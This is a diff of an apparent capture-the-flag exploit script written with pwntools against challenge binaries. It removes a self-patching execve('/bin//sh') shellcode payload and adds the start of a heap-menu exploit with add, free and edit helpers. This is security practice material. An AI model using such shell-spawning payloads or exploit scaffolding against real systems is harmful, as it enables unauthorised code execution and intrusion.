@@ -2,14 +2,14 @@ from pwn import *
 from pwn import p64,u64
 # # from LibcSearcher import *
 
-debug = 0
-gdb_is = 0
+debug = 1
+gdb_is = 1
 # context(arch='i386',os = 'linux')
 context(arch='amd64',os = 'linux', log_level='DEBUG')
 if debug:
     context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
     if not gdb_is:
-        r = process("./shellcode")
+        r = process("./pwn")
     
 else:
     host = "192.168.0.111:53783"
@@ -17,18 +17,23 @@ else:
     gdb_is =0
 
 if gdb_is:
-    r = gdb.debug("./shellcode",'b *0x114514000')
-    pause()
+    r = gdb.debug("./pwn")
+    # pause()
     pass
 
 # r.interactive()
+def add(size):
+    r.sendafter(b'choice:\n',b'1')
+    r.sendafter(b'input size:\n',size.encode())
 
-shellcode  = asm('''
-mov rax,0x114514026;
-mov byte ptr[rax],0x0f
-mov byte ptr[rax+1],0x05
-    ''')
-shellcode += b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\xFF\xFF' 
-info(size(shellcode))
-r.send(shellcode)
+def free():
+    r.sendafter(b'choice:\n',b'3')
+
+def edit(contents):
+    r.sendafter(b'choice:\n',b'2')
+    r.sendafter(b'contents:\n',contents.encode())
+
+add(0x80)
+add(0x80)
+pause()
 r.interactive()
